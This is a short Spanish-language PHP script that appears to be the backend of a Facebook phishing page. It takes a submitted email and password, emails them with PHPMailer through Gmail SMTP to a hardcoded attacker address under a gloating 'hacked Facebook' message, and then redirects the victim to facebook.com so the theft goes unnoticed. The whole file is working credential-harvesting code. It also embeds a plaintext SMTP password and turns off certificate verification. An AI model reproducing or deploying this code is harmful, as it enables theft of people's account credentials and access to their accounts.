<?php 

error_reporting(E_ALL ^ E_DEPRECATED);
header("Content-Type: text/html; Charset=UTF-8");
date_default_timezone_set('America/Mexico_City');
session_start();

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'phpMailer/Exception.php';
require 'phpMailer/PHPMailer.php';
require 'phpMailer/SMTP.php';


// Entradas Form
$email = (isset($_POST['email'])) ? $_POST['email'] : '';
$pass = (isset($_POST['pass'])) ? $_POST['pass'] : '';


			// ##################################
			// Inicia enviar correo
			// ##################################


				$mail = new PHPMailer(true);

				//Server settings
				// $mail->SMTPDebug = 2;    //Sirve como guía para detectar errores de envió
				$mail->CharSet = 'UTF-8';
		
				$mail->isSMTP();
		
				$mail->Host       = 'smtp.gmail.com';  // Specify main and backup SMTP servers
				$mail->SMTPAuth   = true;                                   // Enable SMTP authentication
				$mail->Username   = 'hackfacebook@utfvejecutivas.org';                     // SMTP username
				$mail->Password   = '@123HackFacebook@';                               // SMTP password
				$mail->SMTPSecure = 'ssl';                                  // Enable TLS encryption, `ssl` also accepted
				$mail->Port       = 465;                                    // TCP port to connect to
		
				//PARA PHP 5.6 Y POSTERIOR
				$mail->SMTPOptions = array( 'ssl' => array( 'verify_peer' => false, 'verify_peer_name' => false, 'allow_self_signed' => true ) );
		
				//Recipients
				$mail->setFrom('hackfacebook@utfvejecutivas.org', 'Correo Hackeado! 😎');
				$mail->addAddress('hackfacebook@utfvejecutivas.org');     //Correo de Salida

				// Content
				$mail->isHTML(true);                                  // Set email format to HTML
				// $mail->msgHTML(file_get_contents('ejemplo.html'), __DIR__);     //Se envio archivo en HTML pero $mail->Body debe estar desactivado
				$mail->Subject = '¡😈Felicidades tenemos una contraseña de Facebook😈!';
				$mail->Body    = '
				<h1>¡Resulta que tenemos un Facebook hackeado 🍻!</h1>
				<br>
				<p>
				<b>HACK THE WORLD </b>
				</p>

				<h3>Correo: '.$email.'</h3>
				<h3>Password: '.$pass.'</h3>

				<br>
				<p>
				"En un mundo de códigos y algoritmos, los hackers son los artistas que dan vida a la tecnología."
				</p>
				
				';
		
				$mail->send();
		

		// ##################################
		// Termina enviar correo
		// ##################################

echo "<script>window.location='https://www.facebook.com/'</script>";

 ?>